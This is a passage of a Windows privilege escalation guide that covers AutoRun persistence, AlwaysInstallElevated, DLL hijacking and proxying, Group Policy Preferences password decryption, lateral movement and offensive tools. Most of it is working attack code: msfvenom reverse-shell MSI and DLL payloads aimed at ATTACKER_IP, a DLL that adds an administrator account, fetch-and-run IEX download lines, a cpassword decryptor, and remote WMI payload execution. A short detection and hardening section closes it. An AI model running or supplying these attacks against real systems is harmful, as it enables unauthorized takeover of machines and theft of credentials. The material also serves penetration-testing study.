Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService" -Name DependOnService -Value @("MaliciousService")
```

#### AutoRun Registry Keys

**Common AutoRun locations:**

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

**Enumerate AutoRun entries:**

```powershell
# HKLM Run keys
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"

# HKCU Run keys
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"

# Check permissions on Run keys
Get-Acl "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object -ExpandProperty Access
```

**Add malicious AutoRun entry:**

```powershell
# Add to HKCU (doesn't require admin)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Temp\evil.exe" -PropertyType String

# Add to HKLM (requires admin, but runs for all users)
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "C:\Temp\evil.exe" -PropertyType String
```

#### AlwaysInstallElevated

**Understanding AlwaysInstallElevated:** When both registry keys are set to 1, any user can install MSI packages with SYSTEM privileges.

**Check if enabled:**

```powershell
# Check both required registry values
$hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
    Write-Host "AlwaysInstallElevated is ENABLED - MSI privilege escalation possible!" -ForegroundColor Red
} else {
    Write-Host "AlwaysInstallElevated is not fully enabled"
}
```

**Using reg query:**

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploitation:**

```bash
# Generate malicious MSI on Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

# Transfer to target and install
msiexec /quiet /qn /i C:\Temp\evil.msi
```

### DLL Injection

#### Understanding DLL Search Order

Windows searches for DLLs in this order (by default):

1. Directory of the application
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory (`C:\Windows\System`)
4. Windows directory (`C:\Windows`)
5. Current working directory
6. Directories in PATH environment variable

**DLL hijacking** occurs when an attacker places a malicious DLL in a location that's searched before the legitimate DLL location.

#### DLL Hijacking Enumeration

**Find missing DLLs using Process Monitor:**

```powershell
# PowerShell equivalent - monitor loaded DLLs
Get-Process | Select-Object Name, Id, @{Name="Modules";Expression={($_ | Get-Process).Modules.FileName}} | Format-List
```

**Using PowerShell to find potentially vulnerable applications:**

```powershell
# List applications in Program Files
Get-ChildItem "C:\Program Files" -Recurse -Filter *.exe -ErrorAction SilentlyContinue |
    Select-Object FullName, Directory

# Check if application directory is writable
$apps = Get-ChildItem "C:\Program Files" -Recurse -Filter *.exe -ErrorAction SilentlyContinue

foreach ($app in $apps) {
    try {
        $testFile = Join-Path $app.Directory "test_$(Get-Random).tmp"
        [System.IO.File]::WriteAllText($testFile, "test")
        Remove-Item $testFile -Force
        
        Write-Host "WRITABLE: $($app.Directory)" -ForegroundColor Red
        Write-Host "  Application: $($app.Name)"
    } catch {}
}
```

**Identify DLL load attempts:**

```cmd
REM Use Process Monitor (Procmon) from Sysinternals
REM Filter: Result = "NAME NOT FOUND", Operation = "CreateFile", Path ends with ".dll"
```

#### Finding DLL Hijacking Opportunities

**Check service DLL paths:**

```powershell
# Services that load from registry
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" |
    Where-Object { $_.ImagePath -match "svchost.exe" } |
    Select-Object PSChildName, @{Name="ServiceDLL";Expression={(Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($_.PSChildName)\Parameters" -ErrorAction SilentlyContinue).ServiceDll}}
```

**Check writable directories in PATH:**

```powershell
# Get PATH directories
$pathDirs = $env:PATH -split ';'

foreach ($dir in $pathDirs) {
    if (Test-Path $dir) {
        try {
            $testFile = Join-Path $dir "test_$(Get-Random).tmp"
            [System.IO.File]::WriteAllText($testFile, "test")
            Remove-Item $testFile -Force
            Write-Host "Writable PATH directory: $dir" -ForegroundColor Red
        } catch {}
    }
}
```

#### Creating Malicious DLLs

**Basic DLL structure (C):**

```c
// evil.c - Simple DLL that adds user
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /c net user hacker Passw0rd! /add");
            system("cmd.exe /c net localgroup administrators hacker /add");
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

**Compile on Linux:**

```bash
# 32-bit DLL
i686-w64-mingw32-gcc evil.c -shared -o evil.dll

# 64-bit DLL
x86_64-w64-mingw32-gcc evil.c -shared -o evil.dll
```

**Using msfvenom:**

```bash
# Generate DLL with reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o evil.dll

# Generate DLL with meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o evil.dll
```

#### DLL Proxying/Forwarding

**DLL proxy to maintain functionality:**

```c
// Proxy DLL that forwards legitimate functions while executing payload
#pragma comment(linker, "/export:LegitFunction1=original_dll.LegitFunction1,@1")
#pragma comment(linker, "/export:LegitFunction2=original_dll.LegitFunction2,@2")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Execute payload
        system("cmd.exe /c C:\\Temp\\payload.exe");
        
        // Load original DLL
        LoadLibrary("C:\\Windows\\System32\\original_dll.dll");
    }
    return TRUE;
}
```

[Inference] DLL proxying maintains application functionality while executing malicious code; implementation complexity depends on the number of exported functions.

#### Service DLL Hijacking

**Writable service DLL paths:**

```powershell
# Find services with writable DLL directories
Get-WmiObject Win32_Service | ForEach-Object {
    $serviceName = $_.Name
    try {
        $params = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName\Parameters" -ErrorAction Stop
        if ($params.ServiceDll) {
            $dllDir = Split-Path $params.ServiceDll -Parent
            
            # Test write access
            try {
                $testFile = Join-Path $dllDir "test_$(Get-Random).tmp"
                [System.IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -Force
                
                Write-Host "Writable Service DLL: $serviceName" -ForegroundColor Red
                Write-Host "  DLL Path: $($params.ServiceDll)"
                Write-Host "  Runs as: $($_.StartName)"
            } catch {}
        }
    } catch {}
}
```

**Replace service DLL:**

```powershell
# Backup original DLL
Copy-Item "C:\Path\To\vulnerable.dll" "C:\Path\To\vulnerable.dll.bak"

# Replace with malicious DLL
Copy-Item ".\evil.dll" "C:\Path\To\vulnerable.dll"

# Restart service
Restart-Service -Name VulnerableService
```

#### DLL Search Order Hijacking

**Exploit application's DLL search order:**

```powershell
# Place malicious DLL in application directory
Copy-Item ".\evil.dll" "C:\Program Files\Vulnerable App\missing.dll"

# Launch application
Start-Process "C:\Program Files\Vulnerable App\app.exe"
```

**Common hijackable DLLs:**

- `version.dll` - Often missing from application directories
- `dwmapi.dll` - Desktop Window Manager API
- `cryptsp.dll` - Cryptographic service provider
- `profapi.dll` - User profile API

#### Process Hollowing with DLL

**PowerShell reflective DLL injection:**

```powershell
# Invoke-ReflectivePEInjection from PowerSploit
# Load DLL into memory without touching disk

$PEBytes = [System.IO.File]::ReadAllBytes("C:\Temp\evil.dll")
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcId 1234
```

[Unverified] Reflective DLL injection requires specific PowerShell modules and may be blocked by antivirus or AMSI.

### Group Policy Preferences (GPP)

#### Understanding GPP Vulnerability

**Historical context:** Prior to MS14-025 (2014), Group Policy Preferences stored passwords encrypted with a published AES key. While Microsoft removed the ability to create new GPP passwords, existing ones may remain in domain environments.

**GPP storage locations:**

```
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
```

**Files containing encrypted passwords:**

- `Groups.xml` - Local user account passwords
- `Services.xml` - Service account passwords
- `Scheduledtasks.xml` - Scheduled task account passwords
- `DataSources.xml` - Database connection passwords
- `Printers.xml` - Printer configuration passwords
- `Drives.xml` - Mapped drive credentials

#### Enumerating GPP Files

**Using PowerShell:**

```powershell
# Find all GPP XML files
$domain = $env:USERDNSDOMAIN
$sysvol = "\\$domain\SYSVOL\$domain\Policies"

Get-ChildItem -Path $sysvol -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml","DataSources.xml","Printers.xml","Drives.xml" -ErrorAction SilentlyContinue |
    Select-Object FullName, LastWriteTime
```

**Search for cpassword attribute:**

```powershell
# Search XML files for cpassword
$domain = $env:USERDNSDOMAIN
$sysvol = "\\$domain\SYSVOL\$domain\Policies"

Get-ChildItem -Path $sysvol -Recurse -Include *.xml -ErrorAction SilentlyContinue | ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    if ($content -match 'cpassword') {
        Write-Host "Found cpassword in: $($_.FullName)" -ForegroundColor Red
        $content | Select-String -Pattern 'cpassword="([^"]+)"' -AllMatches | ForEach-Object {
            $_.Matches | ForEach-Object {
                Write-Host "  Encrypted Password: $($_.Groups[1].Value)"
            }
        }
    }
}
```

**Using findstr (CMD):**

```cmd
REM Search for cpassword in all XML files
findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml
```

#### Manual Decryption

**PowerShell decryption function:**

```powershell
function Get-DecryptedCpassword {
    param(
        [string]$Cpassword
    )
    
    try {
        # AES key published by Microsoft
        $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                    0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
        
        # Convert Base64 to bytes
        $cpasswordBytes = [System.Convert]::FromBase64String($Cpassword)
        
        # Create AES decryptor
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $AesKey
        $aes.IV = New-Object Byte[]($aes.IV.Length)
        
        # Decrypt
        $decryptor = $aes.CreateDecryptor()
        $decryptedBytes = $decryptor.TransformFinalBlock($cpasswordBytes, 0, $cpasswordBytes.Length)
        
        # Convert to string
        $decryptedPassword = [System.Text.Encoding]::Unicode.GetString($decryptedBytes)
        
        return $decryptedPassword
    }
    catch {
        Write-Error "Decryption failed: $_"
        return $null
    }
}

# Example usage
$encryptedPassword = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
Get-DecryptedCpassword -Cpassword $encryptedPassword
```

**Using gpp-decrypt (Kali Linux):**

```bash
# Decrypt cpassword value
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

#### Automated GPP Password Extraction

**Using Get-GPPPassword (PowerSploit):**

```powershell
# Download and import
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')

# Execute
Get-GPPPassword

# Output includes username, password, changed date, and file location
```

**Using Metasploit module:**

```bash
# In meterpreter session
use post/windows/gather/credentials/gpp

# Set session
set SESSION 1

# Run
run
```

#### Parsing Groups.xml

**Example Groups.xml structure:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
          name="LocalAdmin" 
          image="2" 
          changed="2019-01-15 10:30:00" 
          uid="{UUID}">
        <Properties action="U" 
                    newName="" 
                    fullName="Local Administrator" 
                    description="Managed by GPP" 
                    cpassword="ENCRYPTED_PASSWORD_HERE" 
                    changeLogon="0" 
                    noChange="0" 
                    neverExpires="1" 
                    acctDisabled="0" 
                    userName="LocalAdmin"/>
    </User>
</Groups>
```

**PowerShell XML parsing:**

```powershell
# Parse Groups.xml
[xml]$xml = Get-Content "\\domain\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml"

$xml.Groups.User | ForEach-Object {
    $username = $_.Properties.userName
    $cpassword = $_.Properties.cpassword
    $changed = $_.changed
    
    if ($cpassword) {
        $decrypted = Get-DecryptedCpassword -Cpassword $cpassword
        
        [PSCustomObject]@{
            Username = $username
            Password = $decrypted
            Changed = $changed
        }
    }
}
```

#### Other GPP Information Sources

**Scheduled Tasks (ScheduledTasks.xml):**

```xml
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <Task name="BackupTask" 
          userContext="1" 
          removePolicy="0">
        <Properties action="U" 
                    name="BackupTask" 
                    runAs="DOMAIN\ServiceAccount" 
                    cpassword="ENCRYPTED_PASSWORD_HERE"/>
    </Task>
</ScheduledTasks>
```

**Services.xml:**

```xml
<Services clsid="{8632D7D2-4985-46c6-8C0C-1FD7AA5D3880}">
    <Service clsid="{06E3BAEB-1177-497b-8C5E-9CDD16BD0C24}" 
             name="CustomService" 
             image="0" 
             changed="2019-02-20 14:00:00">
        <Properties startupType="Automatic" 
                    serviceName="CustomService" 
                    accountName=".\ServiceAccount" 
                    cpassword="ENCRYPTED_PASSWORD_HERE"/>
    </Service>
</Services>
```

#### Post-Exploitation with GPP Credentials

**Test discovered credentials:**

```powershell
# Test local authentication
$username = "LocalAdmin"
$password = ConvertTo-SecureString "DecryptedPassword" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $password)

# Test credential validity
Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock { whoami }

# Test domain authentication
$domainUser = "DOMAIN\ServiceAccount" $domainCred = New-Object System.Management.Automation.PSCredential($domainUser, $password)
```

**Use credentials for lateral movement:**
```powershell
# PSExec-style execution
$session = New-PSSession -ComputerName TARGET_HOST -Credential $credential
Invoke-Command -Session $session -ScriptBlock { 
    whoami
    hostname
    ipconfig
}

# Copy files to remote system
Copy-Item -Path ".\payload.exe" -Destination "\\TARGET_HOST\C$\Temp\" -Credential $credential

# Remote WMI execution
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c C:\Temp\payload.exe" -ComputerName TARGET_HOST -Credential $credential
````

**Privilege escalation with discovered credentials:**

```powershell
# If GPP credential is privileged account
Start-Process powershell -Credential $credential -ArgumentList "-Command whoami /all"

# Run as different user
runas /user:DOMAIN\Administrator cmd.exe
# Enter discovered password when prompted
```

#### Modern GPP Reconnaissance

**Check for legacy GPP even after patch:**

```powershell
# MS14-025 removed ability to create NEW GPP passwords
# But old ones may still exist in SYSVOL

# Comprehensive search
$searchPaths = @(
    "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies",
    "\\$env:USERDNSDOMAIN\NETLOGON"
)

$targetFiles = @(
    "Groups.xml",
    "Services.xml",
    "Scheduledtasks.xml",
    "DataSources.xml",
    "Printers.xml",
    "Drives.xml",
    "Registry.xml"
)

foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Recurse -Include $targetFiles -ErrorAction SilentlyContinue | ForEach-Object {
            Write-Host "Found: $($_.FullName)" -ForegroundColor Yellow
            
            $content = Get-Content $_.FullName -Raw
            if ($content -match 'cpassword="([^"]+)"') {
                Write-Host "  Contains cpassword!" -ForegroundColor Red
            }
        }
    }
}
```

#### Additional GPP Credential Sources

**Drive mappings (Drives.xml):**

```powershell
# Parse drive mappings for credentials
$drivesXml = Get-ChildItem "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies" -Recurse -Filter "Drives.xml" -ErrorAction SilentlyContinue

$drivesXml | ForEach-Object {
    [xml]$xml = Get-Content $_.FullName
    
    $xml.Drives.Drive | ForEach-Object {
        if ($_.Properties.cpassword) {
            [PSCustomObject]@{
                Path = $_.Properties.path
                Username = $_.Properties.userName
                EncryptedPassword = $_.Properties.cpassword
                DecryptedPassword = Get-DecryptedCpassword -Cpassword $_.Properties.cpassword
            }
        }
    }
}
```

**Data sources (DataSources.xml):**

```powershell
# Database connection strings with credentials
$dataSourcesXml = Get-ChildItem "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies" -Recurse -Filter "DataSources.xml" -ErrorAction SilentlyContinue

$dataSourcesXml | ForEach-Object {
    [xml]$xml = Get-Content $_.FullName
    
    $xml.DataSources.DataSource | ForEach-Object {
        if ($_.Properties.cpassword) {
            [PSCustomObject]@{
                DSN = $_.Properties.dsn
                Username = $_.Properties.username
                EncryptedPassword = $_.Properties.cpassword
                DecryptedPassword = Get-DecryptedCpassword -Cpassword $_.Properties.cpassword
            }
        }
    }
}
```

#### GPP Alternative Information Gathering

**Registry.xml (Registry preferences):**

```powershell
# May contain sensitive data in registry values
$registryXml = Get-ChildItem "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies" -Recurse -Filter "Registry.xml" -ErrorAction SilentlyContinue

$registryXml | ForEach-Object {
    [xml]$xml = Get-Content $_.FullName
    Write-Host "`nFile: $($_.FullName)" -ForegroundColor Cyan
    
    $xml.RegistrySettings.Registry | ForEach-Object {
        Write-Host "Key: $($_.Properties.key)"
        Write-Host "Name: $($_.Properties.name)"
        Write-Host "Value: $($_.Properties.value)"
    }
}
```

**Scripts and batch files in SYSVOL:**

```powershell
# Find scripts that might contain hardcoded credentials
Get-ChildItem "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN" -Recurse -Include "*.bat","*.cmd","*.vbs","*.ps1" -ErrorAction SilentlyContinue | ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    
    if ($content -match "password|pwd|pass|credential|secret" -or $content -match "net user|runas") {
        Write-Host "`nPotentially interesting script: $($_.FullName)" -ForegroundColor Yellow
        Write-Host $content
    }
}
```

### Comprehensive Privilege Escalation Enumeration Script

```powershell
function Invoke-PrivescCheck {
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "Windows Privilege Escalation Enumeration" -ForegroundColor Cyan
    Write-Host "========================================`n" -ForegroundColor Cyan
    
    # Unquoted Service Paths
    Write-Host "[*] Checking Unquoted Service Paths..." -ForegroundColor Green
    $unquotedServices = Get-WmiObject -Class Win32_Service |
        Where-Object {
            $_.PathName -notmatch '^"' -and 
            $_.PathName -match '\s' -and
            $_.PathName -notmatch '^[A-Z]:\\Windows\\'
        }
    
    if ($unquotedServices) {
        $unquotedServices | ForEach-Object {
            Write-Host "  [!] $($_.Name)" -ForegroundColor Red
            Write-Host "      Path: $($_.PathName)"
            Write-Host "      Runs as: $($_.StartName)"
        }
    } else {
        Write-Host "  No unquoted service paths found" -ForegroundColor Gray
    }
    
    # Writable Service Registry Keys
    Write-Host "`n[*] Checking Writable Service Registry Keys..." -ForegroundColor Green
    $services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -ErrorAction SilentlyContinue
    $writableServices = @()
    
    foreach ($service in $services) {
        try {
            $acl = Get-Acl $service.PSPath -ErrorAction Stop
            $writeAccess = $acl.Access | Where-Object {
                ($_.IdentityReference -match "Users|Everyone|BUILTIN\\Users|Authenticated Users") -and
                ($_.RegistryRights -match "FullControl|WriteKey|SetValue") -and
                ($_.AccessControlType -eq "Allow")
            }
            
            if ($writeAccess) {
                Write-Host "  [!] $($service.PSChildName)" -ForegroundColor Red
                Write-Host "      Writable by: $($writeAccess.IdentityReference -join ', ')"
                $writableServices += $service.PSChildName
            }
        } catch {}
    }
    
    if ($writableServices.Count -eq 0) {
        Write-Host "  No writable service registry keys found" -ForegroundColor Gray
    }
    
    # AlwaysInstallElevated
    Write-Host "`n[*] Checking AlwaysInstallElevated..." -ForegroundColor Green
    $hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
    $hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
    
    if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
        Write-Host "  [!] AlwaysInstallElevated is ENABLED!" -ForegroundColor Red
        Write-Host "      MSI privilege escalation possible"
    } else {
        Write-Host "  AlwaysInstallElevated not enabled" -ForegroundColor Gray
    }
    
    # Writable PATH Directories
    Write-Host "`n[*] Checking Writable PATH Directories..." -ForegroundColor Green
    $pathDirs = $env:PATH -split ';'
    $writablePaths = @()
    
    foreach ($dir in $pathDirs) {
        if (Test-Path $dir) {
            try {
                $testFile = Join-Path $dir "test_$(Get-Random).tmp"
                [System.IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -Force
                Write-Host "  [!] $dir" -ForegroundColor Red
                $writablePaths += $dir
            } catch {}
        }
    }
    
    if ($writablePaths.Count -eq 0) {
        Write-Host "  No writable PATH directories found" -ForegroundColor Gray
    }
    
    # GPP Password Search
    Write-Host "`n[*] Searching for GPP Passwords..." -ForegroundColor Green
    try {
        $domain = $env:USERDNSDOMAIN
        if ($domain) {
            $sysvol = "\\$domain\SYSVOL\$domain\Policies"
            
            if (Test-Path $sysvol) {
                $gppFiles = Get-ChildItem -Path $sysvol -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml","DataSources.xml" -ErrorAction SilentlyContinue
                
                $foundCpassword = $false
                foreach ($file in $gppFiles) {
                    $content = Get-Content $file.FullName -Raw
                    if ($content -match 'cpassword="([^"]+)"') {
                        Write-Host "  [!] Found cpassword in: $($file.FullName)" -ForegroundColor Red
                        $foundCpassword = $true
                    }
                }
                
                if (-not $foundCpassword) {
                    Write-Host "  No GPP passwords found" -ForegroundColor Gray
                }
            } else {
                Write-Host "  Cannot access SYSVOL (not domain joined or no access)" -ForegroundColor Gray
            }
        } else {
            Write-Host "  Not in domain environment" -ForegroundColor Gray
        }
    } catch {
        Write-Host "  Error accessing GPP files: $_" -ForegroundColor Gray
    }
    
    # AutoRun Registry Keys
    Write-Host "`n[*] Checking AutoRun Registry Keys..." -ForegroundColor Green
    $autorunKeys = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    )
    
    foreach ($key in $autorunKeys) {
        try {
            $acl = Get-Acl $key -ErrorAction Stop
            $writeAccess = $acl.Access | Where-Object {
                ($_.IdentityReference -match "Users|Everyone|BUILTIN\\Users") -and
                ($_.RegistryRights -match "FullControl|WriteKey|SetValue") -and
                ($_.AccessControlType -eq "Allow")
            }
            
            if ($writeAccess) {
                Write-Host "  [!] Writable: $key" -ForegroundColor Red
                Write-Host "      By: $($writeAccess.IdentityReference -join ', ')"
            }
        } catch {}
    }
    
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "Enumeration Complete" -ForegroundColor Cyan
    Write-Host "========================================`n" -ForegroundColor Cyan
}

# Execute enumeration
Invoke-PrivescCheck
```

### Automated Privilege Escalation Tools

#### PowerUp (PowerSploit)

**Download and execute:**

```powershell
# Download PowerUp
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail -ServiceName VulnerableService
```

**Abuse functions:**

```powershell
# Exploit unquoted service path
Write-ServiceBinary -Name 'VulnerableService' -Path 'C:\Program Files\Vulnerable App\service.exe'

# Modify service binary
Install-ServiceBinary -Name 'VulnerableService'

# Add user to administrators
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'
```

#### WinPEAS

**Execute WinPEAS:**

```cmd
REM Download and run
winpeas.exe

REM Run with specific checks
winpeas.exe systeminfo

REM Output to file
winpeas.exe > output.txt
```

**PowerShell version (WinPEAS.ps1):**

```powershell
# Download
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# Execute
Invoke-winPEAS
```

#### Seatbelt

**Information gathering with Seatbelt:**

```cmd
REM Run all checks
Seatbelt.exe -group=all

REM Run specific checks
Seatbelt.exe DpapiMasterKeys
Seatbelt.exe CredEnum
Seatbelt.exe WindowsVault

REM User checks
Seatbelt.exe -group=user

REM System checks
Seatbelt.exe -group=system

REM Run and output to file
Seatbelt.exe -group=all -outputfile="C:\Temp\output.txt"
```

#### PrivescCheck

**PowerShell privilege escalation checker:**

```powershell
# Download
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1')

# Run all checks
Invoke-PrivescCheck

# Extended mode (more thorough)
Invoke-PrivescCheck -Extended

# Output to file
Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,HTML,CSV,XML
```

### Defense and Detection

#### Monitoring for Privilege Escalation Attempts

**PowerShell logging for suspicious activity:**

```powershell
# Check for suspicious PowerShell commands
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object { $_.Message -match "Get-GPPPassword|Invoke-AllChecks|PowerUp|WinPEAS|PrivescCheck" } |
    Select-Object TimeCreated, Message | Format-List

# Monitor service modifications
Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045,7040} -MaxEvents 20 |
    Format-List TimeCreated, Message
```

**Registry monitoring:**

```powershell
# Monitor service registry modifications
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "HKLM:\SYSTEM\CurrentControlSet\Services"
$watcher.IncludeSubdirectories = $true
$watcher.EnableRaisingEvents = $true

Register-ObjectEvent -InputObject $watcher -EventName Changed -Action {
    Write-Host "Registry change detected: $($Event.SourceEventArgs.Name)"
}
```

#### Hardening Recommendations

**Remove unquoted service paths:**

```powershell
# Fix unquoted paths
$service = Get-WmiObject Win32_Service -Filter "Name='VulnerableService'"
$quotedPath = '"' + $service.PathName + '"'

# Using sc config
sc config VulnerableService binpath= "$quotedPath"
```

**Restrict registry permissions:**

```powershell
# Remove write access for standard users
$acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName"
$acl.SetAccessRuleProtection($true, $true)
$acl.Access | Where-Object { $_.IdentityReference -match "Users" } | ForEach-Object {
    $acl.RemoveAccessRule($_)
}
Set-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" $acl
```

**Clean up GPP passwords:**

```powershell
# Remove GPP XML files with cpassword
Get-ChildItem "\\$env:USERDNSDOMAIN\SYSVOL" -Recurse -Include "*.xml" | ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    if ($content -match 'cpassword') {
        Write-Host "Remove or remediate: $($_.FullName)" -ForegroundColor Red
        # Manual review required before deletion
    }
}
```

[Inference] Automated remediation of GPP files should be done carefully to avoid breaking existing Group Policy functionality; manual review is recommended.

### Important Related Topics

For complete Windows privilege escalation coverage, also investigate:

- **Token manipulation** (Token impersonation, SeImpersonatePrivilege abuse)
- **Kernel exploits** (MS16-032, MS16-135, CVE-specific exploits)
- **Scheduled tasks** (Writable task files, SYSTEM task creation)
- **Weak service permissions** (sc sdset, service ACL modification)
- **Unattended installation files** (Unattend.xml, sysprep credentials)
- **SAM/SYSTEM file access** (Volume Shadow Copy, offline extraction)
- **LSASS credential dumping** (Mimikatz, procdump, Task Manager)
- **Pass-the-Hash/Pass-the-Ticket** (NTLM relay, Kerberos attacks)

---

### Scheduled Task Abuse

Scheduled tasks execute commands at specified times or events with defined privileges. Tasks running as SYSTEM or administrators with weak permissions provide privilege escalation opportunities.

#### Understanding Scheduled Tasks

**Task locations:**

- `C:\Windows\System32\Tasks\` - Task XML definitions
- `C:\Windows\Tasks\` - Legacy .job files (Windows XP/2003)

**Task execution contexts:**

- **SYSTEM** - Highest privilege, runs as LocalSystem
- **Administrators** - Administrative privileges
- **Users** - Standard user privileges
- **Service accounts** - Specific service identities

**Task triggers:**

- At system startup
- At user logon
- On schedule (daily, weekly, monthly)
- On event (event log entries)
- On idle
- On session connect/disconnect

#### Enumerating Scheduled Tasks

**Basic enumeration:**

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE /v
```

**Filter for SYSTEM tasks:**

```cmd
schtasks /query /fo LIST /v | findstr /i "SYSTEM\|Task To Run"
```

**PowerShell enumeration:**

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -match "SYSTEM|ADMIN"}
Get-ScheduledTask | Select-Object TaskName, TaskPath, State, @{Name="User";Expression={$_.Principal.UserId}}
```

**Detailed task information:**

```cmd
